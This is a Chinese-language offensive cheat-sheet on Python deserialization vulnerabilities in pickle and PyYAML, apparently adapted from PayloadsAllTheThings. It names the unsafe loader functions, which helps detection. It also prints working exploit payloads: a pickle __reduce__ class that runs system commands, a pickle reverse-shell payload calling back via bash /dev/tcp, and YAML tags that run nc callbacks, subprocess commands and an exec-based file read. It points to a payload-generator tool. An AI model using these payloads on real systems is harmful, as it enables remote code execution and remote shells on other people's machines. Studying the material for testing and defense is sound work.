# Python Deserialization - Python反序列化漏洞

[SEARCH_KEYWORDS]
漏洞类型: Deserialization Python Pickle YAML 反序列化
攻击类型: Remote Code Execution Arbitrary Code Execution
关键词: Python pickle cPickle yaml.load PyYAML ruamel.yaml jsonpickle
技术: __reduce__ YAML Deserialization Code Execution Object Creation
工具: python-deserialization-attack-payload-generator
模块: pickle cPickle _pickle jsonpickle yaml

[CONTENT]

## Python反序列化概述

Python反序列化是从序列化数据重建Python对象的过程。当不可信数据传递给反序列化函数时，可能导致任意代码执行。

## 检测方法

在Python源代码中查找以下危险函数:

- `cPickle.loads`
- `pickle.loads`
- `_pickle.loads`
- `jsonpickle.decode`
- `yaml.load` (无SafeLoader)
- `yaml.unsafe_load`

## Pickle反序列化

### 漏洞代码示例

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"

auth_token = b64encode(cPickle.dumps(h))
```

当token从用户输入加载时产生漏洞:

```python
new_token = raw_input("New Auth Token : ")
token = cPickle.loads(b64decode(new_token))
```

### 利用方法

使用`__reduce__`方法执行任意代码:

```python
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

### 反弹Shell Payload

```python
import pickle, os

class ReverseShell:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'",))

payload = pickle.dumps(ReverseShell())
```

## PyYAML反序列化

### 基本Payload

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

### 命令执行Payload

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

### 读取文件Payload

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

## 版本差异

从PyYAML 6.0开始，`load`默认使用SafeLoader，缓解了RCE风险。

危险函数:
- `yaml.unsafe_load`
- `yaml.load(input, Loader=yaml.UnsafeLoader)`

```py
with open('exploit.yml') as file:
    data = yaml.load(file, Loader=yaml.UnsafeLoader)
```

## 工具

[python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)

支持: pickle, PyYAML, ruamel.yaml, jsonpickle

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/Python.md